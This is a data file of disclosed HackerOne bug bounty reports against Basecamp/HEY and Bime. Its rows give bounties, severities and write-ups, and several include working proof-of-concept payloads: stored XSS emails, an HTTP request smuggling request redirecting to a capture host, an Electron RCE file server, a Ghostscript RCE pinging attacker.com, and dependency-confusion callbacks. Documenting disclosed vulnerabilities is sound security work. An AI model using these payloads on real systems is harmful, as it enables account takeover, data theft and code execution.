2      <input type=""hidden"" name=""client&#95;id"" value=""{your-client-id}"" />
3      <input type=""hidden"" name=""client&#95;secret"" value="""" />
4      <input type=""hidden"" name=""type"" value=""web&#95;server"" />
5      <input type=""hidden"" name=""redirect&#95;uri"" value=""{your-redirect-uri}"" />
6      <input type=""hidden"" name=""commit"" value="""" />
7      <input type=""submit"" value=""Submit request"" />
8    </form>
you will get the {authorization-code} so you can exchange it for an access token
Note that a real attack does not require user interaction.
Impact
Through this vulnerability an attacker can do malicious actions on the victim's account
full API access to  victim's  account",https://hackerone.com/reports/850022,Illinois,United States,Chicago,2020,4,14,23,22
Basecamp,11-50,0.0,10m-50m,$700.00,Medium,6.8,Violation of Secure Design Principles,DNS Setup allows sending mail on behalf of other customers,"aisforarray  submitted a report to Basecamp.Sep 14th (2 years ago)Sent on your behalf
I knew basecamp themselves had used helpscout for support, so I was
curious to see if hey was doing the same.  A quick DNS lookup gave me the answer
I was looking for:
Code 804 BytesWrap lines Copy Download1dig hey.com txt                     
2
3; <<>> DiG 9.10.6 <<>> hey.com txt
4;; global options: +cmd
5;; Got answer:
6;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 48297
7;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 1
8
9;; OPT PSEUDOSECTION:
10; EDNS: version: 0, flags:; udp: 4096
11;; QUESTION SECTION:
12;hey.com.			IN	TXT
13
14;; ANSWER SECTION:
15hey.com.		60	IN	TXT	""cyssd1dn8z15bmffrprj1hzycw436gzh""
16hey.com.		60	IN	TXT	""google-site-verification=k7w8RY2bLljThqEsIGQOoQlclHp19HawwdiHTq2nJpw""
17hey.com.		60	IN	TXT	""google-site-verification=VH8KKQzQ7gWsKxSsibqBexLteqs254PwGFS37Hf22MQ""
18hey.com.		60	IN	TXT	""v=spf1 include:_spf.hey.com include:helpscoutemail.com -all""
19
20;; Query time: 39 msec
21;; SERVER: 192.168.42.1#53(192.168.42.1)
22;; WHEN: Fri Jun 26 17:20:34 PDT 2020
23;; MSG SIZE  rcvd: 315
Ok.  That's interesting.  helpscoutemail.com has permissions to send email on
behalf of hey.com.  For completeness let's look at helpscoutmail.com spf
records:
Code 644 BytesWrap lines Copy Download1dig helpscoutemail.com txt
2
3; <<>> DiG 9.10.6 <<>> helpscoutemail.com txt
4;; global options: +cmd
5;; Got answer:
6;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 47004
7;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
8
9;; OPT PSEUDOSECTION:
10; EDNS: version: 0, flags:; udp: 4096
11;; QUESTION SECTION:
12;helpscoutemail.com.		IN	TXT
13
14;; ANSWER SECTION:
15helpscoutemail.com.	300	IN	TXT	""v=spf1 ip4:54.173.229.38 ip4:52.0.20.102 ip4:54.174.116.32 ip4:52.2.238.96 ip4:52.20.146.34 ip4:34.198.122.65 ~all""
16
17;; Query time: 42 msec
18;; SERVER: 192.168.42.1#53(192.168.42.1)
19;; WHEN: Fri Jun 26 17:32:45 PDT 2020
20;; MSG SIZE  rcvd: 174
How can we exploit this?
First, let's go ahead and create an account over at helpscout.  It can be
anything.  Let's setup an inbox.  Again, it can be anything, doesn't really
matter.  What does matter is that we setup a custom address for the inbox.
Of course, helpscout makes sure we have access to the email address we're
acting as.  
So let's go ahead and setup an email as dhhracing@hey.com.  First, we sign up
for a trial on hey.com with that email.  All good.  Now, let's enter that into
helpscout.  Once we get the verification email in hey, we enter the verification
in helpscout.  But... generally there is another step.  Helpscout needs to have
permission to send on our behalf.  How do they do that?  With DNS records for
SPF, DKIM and DMARC.  But... hey.com has already done that as they themselves
are helpscout customers.
Now here is where the trouble comes in.  hey.com has a recycle policy.  If you
create a trial but never pay, or as for a refund, then after 30 days the email
address becomes available again.  So let's go ahead and cancel our
dhhracing@hey.com account (in hey, not in sendgrid).  Now we wait 30 days.  Now,
DHH realizes he needs an address for his racing.  So he goes to hey.com and
creates an account under dhhracing@hey.com.  And what do you know, it's
available!
But now, not only can DHH send email from dhhracing@hey.com, but SO CAN I.  From
my helpscout account.  Of course, I won't receive mail from that account, but I
could always just send out mail and CC another address that I own and hope for a
reply-all.  But really, the options for scamming are limitless.
I've suggested a few options to hey.com:

Don't use the primary domain on helpscout.  Setup heysupport.com or
something similar.
Don't ever recycle accounts.  I can only ever see this causing issues.
Get helpscout to treat hey.com as a mail provider and don't allow sending
from their domain.

Impact
An attacker could spoof any hey.com email address that they had originally created an address for (and had been recycled).  This could allow them to appear to be a high-profile individual or company.  By CCing an address that they currently own they could receive replies from the correspondence as well.",https://hackerone.com/reports/981824,Illinois,United States,Chicago,2020,9,14,16,41
Basecamp,11-50,0.0,10m-50m,$100.00,Low,2.0,Violation of Secure Design Principles,Error Page Content Spoofing or Text Injection ,"princej_76  submitted a report to Basecamp.Jun 26th (about 1 year ago)Target:  https://gopher.hey.com/
Description:  Content spoofing, also referred to as content injection, ""arbitrary text injection"" or virtual defacement, is an attack targeting a user made possible by an injection vulnerability in a web application. When an application does not properly handle user-supplied data, an attacker can supply content to a web application, typically via a parameter value, that is reflected back to the user. This presents the user with a modified page under the context of the trusted domain.
Steps to Reproduce:

Go to https://gopher.hey.com/
Type any thing after slash, it will be reflected on the page.

Reference: https://hackerone.com/reports/498562
https://hackerone.com/reports/327671
Impact
This attack is typically used as, or in conjunction with, social engineering because the attack is exploiting a code-based vulnerability and a user's trust. As a side note, this attack is widely misunderstood as a kind of bug that brings no impact.2 attachments:F1354152: Screenshot_from_2021-06-26_16-56-41.pngF1354154: Screenshot_from_2021-06-26_16-56-07.png",https://hackerone.com/reports/1245051,Illinois,United States,Chicago,2021,6,26,11,38
Basecamp,11-50,0.0,10m-50m,$300.00,Low,2.0,Phishing,Domain Takeover [3737signals.com],"mrmax4o4  submitted a report to Basecamp.Jul 8th (about 1 year ago)Hi,
While i was analyzing the Basecamp3 Android app i found 3737signals.com on the source code as i understand you are passing it to the intentto view it on some case.
Image F1368921: Basecamp_STO2.png 179.96 KiBZoom in Zoom out Copy Download
When I opened it on the browser I got DNS error says the domain name does not exist
Image F1368922: Basecamp_STO3.png 84.50 KiBZoom in Zoom out Copy Download
As you can see at the bottom of the page webmaster is the domain name provider so I navigated to webmaster.com and searched for 3737sihttps://www.webmasters.com/domains/new.php?domain=3737signals.com&Action=Submit&Domain=3737signals&Suffix=.com&x=0&y=0gnals.com and found that it's available to register 
Image F1368920: Basecamp_STO.png 230.12 KiBZoom in Zoom out Copy Download
I am not sure if it's yours but if it's not just notify me to self close the report
Impact

Fake website
Malicious code injection
Users tricking
Company impersonation

This issue can have really huge impact on the companies reputation someone could post malicious content on the compromised site and then your users will think it's official but it's not.
Best Wishes,
MrMax3 attachments:F1368920: Basecamp_STO.pngF1368921: Basecamp_STO2.pngF1368922: Basecamp_STO3.png",https://hackerone.com/reports/1253926,Illinois,United States,Chicago,2021,7,8,0,28
Basecamp,11-50,0.0,10m-50m,"$5,000.00",Critical,9.5,Cross-site Scripting (XSS) - Stored,HEY.com email stored XSS,"jouko  submitted a report to Basecamp.Sep 15th (2 years ago)An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails.
To reproduce the bug you have to send raw HTML-formatted email. You can do it e.g. with the Sendmail tool on Linux.
Example email:
Code 547 BytesWrap lines Copy Download1From: jouko@klikki.fi
2To: jouko@hey.com
3Subject: HackerOne test
4MIME-Version: 1.0
5Content-type: text/html
6
7<style>
8url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);
9url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact_outbound_forwarding[to_email_address]\000020value=joukop@gmail.com\00003e\00003c/form\00003exxx);
10</style>
To send the email, create a text file with the above contents. Send it with the command
Code 33 BytesWrap lines Copy Download1/usr/sbin/sendmail -t < email.txt
The backslashes in the <style> tag are decoded. The first \000027 confuses the HTML filter. The encoded <message-content> and <template> tags are there to escape the DOM shadowroot element. The HTML filter doesn't let you inject only closing tags, i.e. </template>, you need an opening tag first.
Finally, HTML like this is injected:
Code 185 BytesWrap lines Copy Download1<form action=""/my/accounts/266986/forwardings/outbound"" data-controller=""beacon"">
2<input type=text name=""contact_outbound_forwarding[to_email_address]"" value=""joukop@gmail.com"">
3</form>
This exploits the Stimulus framework and the existing JavaScript controllers to post the form automatically. The CSRF token is inserted by the framework. This example sets up email forwarding to an external address.
This is just one way to exploit the bug. Even though plain <script> won't work in modern browsers due to the Content Security Policy, It seems likely there are ways to bypass it by using the JS frameworks (will look at this more). The account ID in this PoC has to be guesstimated or brute forced (266986).
Another example is to simply set the form action to an attacker URL. This will send the user's CSRF token to the attacker so that it could be used in a subsequent attack.
The POST request in Chrome's developer console:
Image F988220: hey.png 140.06 KiBZoom in Zoom out Copy Download
If you want to view the email on my HEY account (jouko@hey.com) the email ID is 83625339.
Impact
A HEY user viewing an email sent by the attacker may have their account compromised.1 attachment:F988220: hey.png",https://hackerone.com/reports/982291,Illinois,United States,Chicago,2020,9,15,3,13
Basecamp,11-50,0.0,10m-50m,"$1,700.00",Critical,9.5,HTTP Request Smuggling,HTTP request smuggling on Basecamp 2 allows web cache poisoning,"hazimaslam  submitted a report to Basecamp.Jul 8th (2 years ago)It is found that an authenticated Basecamp 2 user can desync front and backend servers and poison the socket with harmful response for the next visitor.  During redirect probe, It also appears that front-end infrastructure performs caching of content. Using HTTP request smuggling attack, It is possible to poison the cache with the off-site redirect response using X-Forwarded-Host request header in smuggled request. This will make the attack persistent, affecting any user who subsequently requests the affected URL.
Validation steps
1.  Open https://requestbin.com/r/enjv2g5042bg in your browser for request capturing.
2. Paste the following request in Burp repeater (I've embedded my session in the request for your ease):
Code 898 BytesWrap lines Copy Download1POST /4618984/account HTTP/1.1
2Host: basecamp.com
3Connection: keep-alive
4Content-Length: 144
5Accept: */*
6X-CSRF-Token: BW5Kp3r1hLOuZI6+4GkBW5XUpkt55bi9tIiqgKFo1ZY=
7User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
8Content-Type: application/x-www-form-urlencoded; charset=UTF-8
9Cookie: _basecamp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTAwNzU0OTI3NWZjMTI0Zjk5ZTVlOGE5NTU0MGFhN2UyBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMUJXNUtwM3IxaExPdVpJNis0R2tCVzVYVXBrdDU1Ymk5dElpcWdLRm8xWlk9BjsARkkiDnBlcnNvbl9pZAY7AEZpBHYSEQE%3D--ced0e607b9844aff72e0b9421e73e4d52c8b04bc;identity_id=BAhpBOwxQgE%3D--3a11dbd3096b61294dc6c864b807a87944e4b6ab;
10Transfer-Encoding: chunked
11Transfer-encoding: identity
12
1322
14_method=patch&account%5Bname%5D=BC
150
16
17GET /x HTTP/1.1
18X-Forwarded-Host: enjv2g5042bg.x.pipedream.net
19X-Forwarded-Proto: http
20Foo: bar
Make sure to set the target to https://basecamp.com and port to 443.
3. Issue the request in repeater.
4. Observe the captured request in RequestBin.com
Impact


With request smuggling, attacker can serve harmful response to random people actively browsing the website, enabling straightforward mass-exploitation.


By redirecting javascript imports to a malicious domain, an attacker can inject a key-logger and steal user passwords from login page.


It is also possible to capture visitors' request headers and cookies.",https://hackerone.com/reports/919175,Illinois,United States,Chicago,2020,7,8,18,38
Basecamp,11-50,0.0,10m-50m,"$7,500.00",Critical,9.5,HTTP Request Smuggling,HTTP Request Smuggling via HTTP/2,neex  submitted a report to Basecamp.May 28th (about 1 year ago),https://hackerone.com/reports/1211724,Illinois,United States,Chicago,2021,5,28,12,23
Basecamp,11-50,0.0,10m-50m,$100.00,Low,2.0,None,Information Disclosure .htaccess accesible for public,"aloneh1  submitted a report to Basecamp.Jun 23rd (about 1 year ago)Hello team!
While doing a preliminary recon on the sub domain of  ""launchpad.37signals.com""  I've come across a few sensitive files that should not be facing the public web; I'll leave you a list organized by criticality and some proof.
Information disclosure of path .htaccess on the subdomain of https://launchpad.37signals.com/
POC url : https://_domainkey.launchpad.37signals.com/.htaccess
Medium priority
.htaccess file for https://_domainkey.launchpad.37signals.com 
Options +ExecCGI +MultiViews +FollowSymLinks
AddHandler cgi-script .cgi
php_value include_path ""include:../include""
RewriteEngine on
RewriteCond sprockets.js !-f
RewriteRule ^sprockets.js /nph-sprockets.cgi [P,L]
Uncomment the next line to enable Sprockets caching
SetEnv sprockets_generate_output_file true
step to reproduce :
go to the url :https://_domainkey.launchpad.37signals.com/
after add .htacces to the endpoint of url 
like https://_domainkey.launchpad.37signals.com/.htaccess
the page says download the content of .htaccess as a popup.
Impact
The publicly accessible .htaccess  might be serious as long as those credentials are really being used somewhere (and it seems to me the DBMS isn't facing the public internet anyway). The real impact is that finding such files always grabs the attention of a threat actor, which might give up not so easily influenced by the fact that there might be ""more"".2 attachments:F1349744: Screenshot_from_2021-06-23_15-45-21.pngF1349745: Screenshot_from_2021-06-23_15-45-55.png",https://hackerone.com/reports/1241849,Illinois,United States,Chicago,2021,6,23,10,18
Basecamp,11-50,0.0,10m-50m,$100.00,Low,2.0,Information Disclosure,Information Disclosure of Garbage Collection Cycle,"ahmd_halabi  submitted a report to Basecamp.Sep 14th (2 years ago)Hello,
Upon enumerating a subdomain content I found a directory that discloses the duration of the garbage collection cycles.
I think that these information should be kept private because public should not know information about the target application and how it operates or do its garbage collection process.
Steps To Reproduce

Navigate to the target url: https://gopher.hey.com/metrics
See the data.

███
Impact
This information may help attackers understand more things about the target application which may help in further investigation and exploitation.
Kind Regards.",https://hackerone.com/reports/981796,Illinois,United States,Chicago,2020,9,14,15,56
Basecamp,11-50,0.0,10m-50m,"$5,000.00",High,7.95,Command Injection - Generic,Insecure Bundler configuration fetching internal Gems (okra) from Rubygems.org,"zofrex  submitted a report to Basecamp.Feb 16th (2 years ago)I believe (most likely) that one of your projects is not set up correctly to only pull internal gems from your internal gem server, and instead will pull gems from Rubygems.org if the version number there is higher.
Specifically, the ""okra"" gem.
At around 15:21 today (UTC) the okra gem that I wrote – https://rubygems.org/gems/okra – was installed on the machine with hostname ""oscillatinghost"" under the username ""fernando"" on your network.
This would be possible if the Gemfile either installs gems from global sources (thus allowing the version on Rubygems to 'trump' the internal version) or if the okra gem is depended on by another internal gem, and your version of Bundler is less than 2.2.10 – see here for details on that: https://bundler.io/blog/2021/02/15/a-more-secure-bundler-we-fixed-our-source-priorities.html
It is possible this is not correct, and instead, someone typed ""gem install okra"" without specifying where to fetch the Gem from. This would potentially also have fetched it from Rubygems.
Please note that the Gem I wrote does not do anything malicious, and only fetches the minimum information I need to filter out false positives and correctly identify organisations. You can verify this yourself by looking at the code for the gem ""okra-90002.0"" in your gems folder. I will delete all information relating to your organisation as soon as it is no longer needed.
Impact
The impact is that an attacker could achieve arbitrary Remote Code Execution on any machines that will fetch the gem from the Rubygems repository.
Note that to achieve code execution, merely installing the Gem is enough, it does not have to be require'd or run.Summary by zofrexI found an internal gem (Ruby library) in use by Basecamp that was not registered on Rubygems (the public Ruby package repository). I registered a gem of my own under the name that would call back when installed, in an attempted ""dependency confusion"" attack.
Although this attack was not successful against any production machines or automated builds, as Basecamp had successfully mitigated against the attack in those places, my library was installed on a developer machine when a member of Basecamp attempted to install the gem by hand using ""gem install"" rather than running a ""bundle install"".
This vulnerability was resolved by using configuration management software to set the default package repository on developer machines to one controlled by Basecamp, where they can control which packages come from which repositories and can prevent internal packages being pulled from Rubygems.",https://hackerone.com/reports/1104874,Illinois,United States,Chicago,2021,2,16,17,13
Basecamp,11-50,0.0,10m-50m,$100.00,Low,2.0,Insufficient Session Expiration,Login session not expire,zukito  submitted a report to Basecamp.Aug 7th (about 1 year ago),https://hackerone.com/reports/1294231,Illinois,United States,Chicago,2021,8,7,2,49
Basecamp,11-50,0.0,10m-50m,$250.00,Low,2.6,Improper Authentication - Generic,Password reset link not expiring after changing password in settings,zukito  submitted a report to Basecamp.Aug 3rd (about 1 year ago),https://hackerone.com/reports/1288898,Illinois,United States,Chicago,2021,8,3,16,11
Basecamp,11-50,0.0,10m-50m,"$1,000.00",High,7.95,Cross-site Scripting (XSS) - DOM,Possible DOM XSS on app.hey.com,"enigmaticjohn  submitted a report to Basecamp.Oct 16th (2 years ago)Summary:
Hello Team,
While testing it was observed that on https://app.hey.com/, on Search box there is a possibility of XSS. Although the payload is reflected in the DOM but the CSP blocks the execution of the script, the XSS can happen if the CSP is somehow bypassed. The Subject parameter is vulnerable.
Apart from XSS, the HTML injection attack is working pretty straight forward.
Steps To Reproduce:

Go to https://app.hey.com
Login to your account.
Click on 'Write' Mail button.
Add the recipient as yourself.
In the Subject, add following payload

Code 76 BytesWrap lines Copy Download1TestPayload&lt;/a&gt;&lt;a href=""javascript:alert(1)""&gt;ClickHere&lt;/a&gt;

Send the mail.
Go to top left corner Search Box and type ""TestPayload"" 
You will see the mail you sent to yourself, and <a> tag will be there ""ClickHere"".
Click on it, you will see the CSP violation in the Console.
Below is the CSP of the page:

Code 368 BytesWrap lines Copy Download1script-src 'self' https://production.haystack-assets.com stats.hey.com *.braintreegateway.com *.braintree-api.com hcaptcha.com *.hcaptcha.com; 
2object-src 'none'; 
3base-uri 'none'; 
4form-action 'self'; 
5frame-ancestors 'none'; 
6report-uri https://sentry.io/api/1371426/security/?sentry_key=3a5ea420eecc45bd9e1d1c2424683f3a&sentry_environment=production&sentry_release=
As seen from the CSP, there might be a possibility of Host whitelists bypass.
Impact
If attacker send such type of mail to a victim and if victim accidentally searches for the same mail then the Script will be executed leading to account takeover. This is possible only if CSP is bypassed.",https://hackerone.com/reports/1010132,Illinois,United States,Chicago,2020,10,16,13,57
Basecamp,11-50,0.0,10m-50m,$200.00,Low,2.0,Privilege Escalation,Privilege Escalation leads to trash other users comment without having admin rights.,fuzzsqlb0f  submitted a report to Basecamp.Aug 17th (about 1 year ago),https://hackerone.com/reports/1307943,Illinois,United States,Chicago,2021,8,17,5,45
Basecamp,11-50,0.0,10m-50m,"$1,250.00",High,7.95,Code Injection,Remote Code Execution in Basecamp Windows Electron App,"co0sin  submitted a report to Basecamp.Oct 23rd (2 years ago)The Windows application for Basecamp, allows a ""Download"" feature for images in your posts. Under certain restrictions, those files are downloaded and sometimes even automatically opened (executed). The file will be executed if it's a download from an internal URL and the mimetype is text/calendar. But these restrictions can be bypassed to execute an attacker crafted file.
I was able to craft a link, which when clicked by a user, will be downloaded and executed! 
To get file execution on the user, we bypass the restrictions first:
There is a regular expression which checks for ""internal domains"", which can easily be bypassed by controlling the subdomain. The host pattern is /(launchpad\.37signals\.com|launchpad\.(?:dev|test))/ and /(3\.(?:staging\.)?basecamp\.com|bc3\.(?:dev|test))/. By controlling the subdomain, and setting it to something like launchpad.dev.mydomain.com, we can bypass this regular expression verification.
Since we'll be sending the request to our own server, we simply need to return text/calendar as the content-type header. This can be seen in the Electron code in OPENABLE_MIME_TYPES = new Set([""text/calendar""]);
And then when adding the URL to your post, simply add the ?attachment=true to the URL. 
To reproduce, simply register any subdomain that starts with launchpad.dev. (mine is launchpad.dev.████).
An HTTP server with the needed mimetype header, can be setup with Flask easily with this code:
Code 267 BytesWrap lines Copy Download1from flask import Flask, send_from_directory
2app = Flask(__name__)
3@app.route('/<path:path>')
4def hello(path):
5    return send_from_directory(""."", ""file.exe"", as_attachment=True, mimetype=""text/calendar"")
6if __name__ == '__main__':
7    app.run(port=80,host=""0.0.0.0"")
Then add the link to your post with the appropriate attachment parameter, as such:
http://launchpad.dev.█████████/file.exe?attachment=true
Impact
Remote code execution on any user which clicks a link on your crafted post through the desktop app.",https://hackerone.com/reports/1016966,Illinois,United States,Chicago,2020,10,23,11,30
Basecamp,11-50,0.0,10m-50m,"$2,000.00",Critical,9.5,Command Injection - Generic,Remote code execution on Basecamp.com,"gammarex  submitted a report to Basecamp.Jun 13th (4 years ago)A critical flaw in Basecamp's profile image upload function leads to remote command execution. Images are converted on the server side, but not only image files but also PostScript/EPS files are accepted (if renamed to .gif). This is probably due to ImageMagick / GraphicsMagick being used for image conversion, which calls a PostScript interpreter (Ghostscript) if the input file starts with '%!'. The used Ghostscript version however has a security bug (CVE-2017-8291) leading to remote command execution.
/Proof of concept/: Upload the attached rce.gif file as profile image (change the `ping -c1 attacker.com' to some other shell command).
/Mitigation/: Upgrade Ghostscript; also, before processing uploaded images make sure they are real image files (e.g. based on magic header)
Impact
Gain a remote shell; from here start exploitation/privilege escalation1 attachment:F308414: rce.gifBasecamp  rewarded gammarex with a $2,000 bounty. Jun 13th (4 years ago)Thanks, Jens! We greatly appreciate you identifying this vulnerability and disclosing it responsibly. We’re awarding you $2,000—one of our largest bounties to date—because this is among the most serious vulnerabilities possible.georgeclaghorn   closed the report and changed the status to Resolved. Jun 13th (4 years ago)We resolved this by disallowing the libgs-based PS and PDF coders in our ImageMagick security policy.
    
    
        
            
                
                
                
            
        
    
gammarex   posted a comment. Jun 13th (4 years ago)Thanks a lot for the bounty, appreciate it!Basecamp  rewarded gammarex with a $3,000 bounty. Updated Jun 13th (4 years ago)After some discussion amongst our security and operations teams, we’re adding $3,000 to your bounty to better acknowledge the severity of this vulnerability. Thanks again!
    
    
        
            
                
                
                
            
        
    
gammarex   posted a comment. Jun 13th (4 years ago)Wow, thanks again -- really appreciate it!georgeclaghorn   requested to disclose this report. Oct 27th (2 years ago)  This report has been disclosed. Nov 26th (2 years ago)",https://hackerone.com/reports/365271,Illinois,United States,Chicago,2018,6,13,7,27
Basecamp,11-50,0.0,10m-50m,$750.00,Medium,5.45,Cross-site Scripting (XSS) - Stored,stored XSS in hey.com message content,"carbon61  submitted a report to Basecamp.Sep 22nd (2 years ago)Hi
I found a stored xss using message[content] parameter when forwarding an email or saving it as draft ,  and when the victim click on the email to view it, it gets executed .
I used this payload as the message content :
Code 3.27 KiBWrap lines Copy Download1From: ""f"" <[]@hey.com>
2To: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com
3Message-ID: <3654584aa703ca2fd963856f8495669174ef673f@hey.com>
4Subject: <img src=wczxzx onerror=alert(1)>
5Mime-Version: 1.0
6
7    </style>
8    </div>
9    <svg><![CDATA[><table background=""]])><img src=xx:x onerror=alert(2)//""></svg>
10    <li style=onesr: src= cxxc=></li>
11    style>
12</style>
13  </head>
14<style></style>
15  <body>
16
17<svg><![CDATA[><image xlink: src=""]]><img src=xx:x onerror=alert(2)//""></svg>
18<li style=onerror:jkj/onerror=alert(1); =''ds></li>
19    </div>
20  </body>
21</html>
22```
23
24#Note:
25 i submitted this stored xss without the CSP bypass just to try not to get a duplicate , i will try to bypass the CSP and let you know.
26
27##Steps To Reproduce:
281- make two accounts and login to the first one 
292- go to any email and forward it to the second email account and intercept the request and change it like this:
30```
31POST /messages HTTP/1.1
32Host: app.hey.com
33User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
34Accept: text/html; page-update, text/html, application/xhtml+xml
35Accept-Language: ar,en-US;q=0.7,en;q=0.3
36Accept-Encoding: gzip, deflate
37Referer: https://app.hey.com/entries/[]/forwards/new
38X-CSRF-Token: []
39Content-Type: multipart/form-data; boundary=---------------------------392581797716153644644274802600
40Origin: https://app.hey.com
41Content-Length: 1156
42DNT: 1
43Connection: close
44
45
46-----------------------------392581797716153644644274802600
47Content-Disposition: form-data; name=""acting_user_id""
48
49{acting_user_id}
50-----------------------------392581797716153644644274802600
51Content-Disposition: form-data; name=""entry[addressed][directly][]""
52
53[second-email]@hey.com
54-----------------------------392581797716153644644274802600
55Content-Disposition: form-data; name=""message[subject]""
56
57Fwd: csdc
58-----------------------------392581797716153644644274802600
59Content-Disposition: form-data; name=""message[content]""
60
61From: ""f"" <[]@hey.com>
62To: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com
63Message-ID: <3654584aa703ca2fd963856f8495669174ef673f@hey.com>
64Subject: <img src=wczxzx onerror=alert(1)>
65Mime-Version: 1.0
66
67    </style>
68    </div>
69    <svg><![CDATA[><table background=""]])><img src=xx:x onerror=alert(2)//""></svg>
70    <li style=onesr: src= cxxc=></li>
71    style>
72</style>
73  </head>
74<style></style>
75  <body>
76
77<svg><![CDATA[><image xlink: src=""]]><img src=xx:x onerror=alert(2)//""></svg>
78<li style=onerror:jkj/onerror=alert(1); =''ds></li>
79    </div>
80  </body>
81</html>
82-----------------------------392581797716153644644274802600
83Content-Disposition: form-data; name=""_method""
84
85post
86-----------------------------392581797716153644644274802600--
87
88```
89
903- go to the second email ``` Imbox ``` and click on the email to view it 
914- use the right click on email content to get the devtools and if you view the chrome console you can see the 
92```
93about:blank:1 Refused to execute inline event handler
94 because it violates the following Content Security Policy
95 directive: ""script-src 'self' https://production.haystack-assets.com *.braintreegateway.com *.braintree-api.com hcaptcha.com *.hcaptcha.com"". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.
96```
97
98## Impact
99
100using this xss + CSP bypass the attacker can steal data and perform unwanted actions on a victim's behalf.",https://hackerone.com/reports/988272,Illinois,United States,Chicago,2020,9,22,15,31
Bime,1001-5000,0.0,No value,"$1,000.00",No value,0.0,Information Disclosure,Attacker can access graphic representation of every query,"jobert  submitted a report to Bime.Jul 8th (6 years ago)Vulnerability details
On a dashboard, widgets can be added to show a graphic representation of a query. These queries come from datasources. When creating a widget, a query ID is given. This query ID can be changed in order to obtain the results of the dataset through a scheduled email. This leaks (sensitive) information of other customers their dataset.
Proof of concept
Sign in as a normal user - I used my personal email address on the https://h1-bugbounty.bime.io domain. After creating your first dashboard, a POST request is sent to the /widgets.json endpoint. It'll look something like this:
Code 1.08 KiBWrap lines Copy Download1POST /widgets.json HTTP/1.1
2Host: h1-bugbounty.bime.io
3...
4
5{""title"":""SUM(Dynamic Count) per ID"",""height"":0,""position_x"":0,""position_y"":0,""width"":0,""query_id"":1052531,""tab_id"":612224,""visualisation_type"":""none"",""configuration"":""<Properties><Config name=\""borderColor\"" value=\""#787c82\""/><Config name=\""headerBackgroundColor\"" value=\""#787c82\""/><Config name=\""headerColor\"" value=\""#ffffff\""/><Config name=\""headerFontItalic\"" value=\""false\""/><Config name=\""headerFontSize\"" value=\""16\""/><Config name=\""headerFontUnderline\"" value=\""false\""/><Config name=\""headerFontWeight\"" value=\""false\""/><Config name=\""hidden\"" value=\""false\""/><Config name=\""hideHeader\"" value=\""false\""/><Config name=\""hideLoaders\"" value=\""false\""/><Config name=\""hideWindowBorder\"" value=\""false\""/><Config name=\""layout\"" value=\""vertical\""/><Config name=\""numberOfLineHeader\"" value=\""2\""/><Config name=\""position\"" value=\""absolute\""/><Config name=\""roundedEdges\"" value=\""0\""/><Config name=\""textForTextWidget\"" value=\""\""/><Config name=\""textFontSize\"" value=\""16\""/><Config name=\""zOrder\"" value=\""0\""/></Properties>""}
Notice the query_id in the request. Change this ID to the query object that you want to see the data of. Now go to the web application and click on Dashboards in the left column. It'll look something like this:
Image F103809: Screen_Shot_2016-07-07_at_21.41.00.png 54.35 KiBZoom in Zoom out Copy Download
As you can see, there's an empty widget. This is caused by the fact that the user is not authorized to view the data. This is good. I tried exporting the data by clicking the Export button at the bottom. However, this does not leak the data, the images and PDFs I downloaded show up empty. This is also good. But when I scheduled an email reminder for every 5 minutes, and I waited 5 minutes, I received a PDF and image in my inbox that contained the actual data:
Image F103811: Screen_Shot_2016-07-07_at_21.43.48.png 80.47 KiBZoom in Zoom out Copy Download
It seems that the authorization / authentication is implemented differently when executed asynchronous, which allows an attacker to obtain actual data from other customers' datasources and queries. Let me know if you need more information!2 attachments:F103809: Screen_Shot_2016-07-07_at_21.41.00.pngF103811: Screen_Shot_2016-07-07_at_21.43.48.png",https://hackerone.com/reports/149914,No value,No value,No value,2016,7,8,4,45
Bime,1001-5000,0.0,No value,"$1,000.00",No value,0.0,Privilege Escalation,SSRF in the Connector Designer (REST and Elastic Search),agarri_fr  submitted a report to Bime.Jan 22nd (7 years ago),https://hackerone.com/reports/112156,No value,No value,No value,2016,1,22,2,51
Bime,1001-5000,0.0,No value,$250.00,No value,0.0,Command Injection - Generic,SSRF issue,4lemon  submitted a report to Bime.Mar 2nd (7 years ago),https://hackerone.com/reports/120219,No value,No value,No value,2016,3,2,22,34
Bime,1001-5000,0.0,No value,$150.00,No value,0.0,None,Subdomain takeover at ws.bimedb.com due to unclaimed Amazon S3 bucket,sameoldstory  submitted a report to Bime.Aug 19th (6 years ago),https://hackerone.com/reports/161428,No value,No value,No value,2016,8,19,19,49
Bime,1001-5000,0.0,No value,$150.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Subdomain takeover due to unclaimed Amazon S3 bucket on a2.bime.io,"michiel  submitted a report to Bime.Mar 8th (7 years ago)I noticed BIME is primarily built on Amazon AWS, which spawned my interest. I started looking for DNS entries that were still pointing to S3 buckets that however no longer exist. It appears this was the case for a2.bime.io, which points to an Amazon S3 website bucket in the US East region. 
Steps to Reproduce

Resolve a2.bime.io and see what is behind it:

Code 826 BytesWrap lines Copy Download1michiel@msp ~ $ dig A a2.bime.io @8.8.8.8                                                                                                [2.1.8]
2
3; <<>> DiG 9.9.5-11ubuntu1.2-Ubuntu <<>> A a2.bime.io @8.8.8.8
4;; global options: +cmd
5;; Got answer:
6;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 730
7;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1
8
9;; OPT PSEUDOSECTION:
10; EDNS: version: 0, flags:; udp: 512
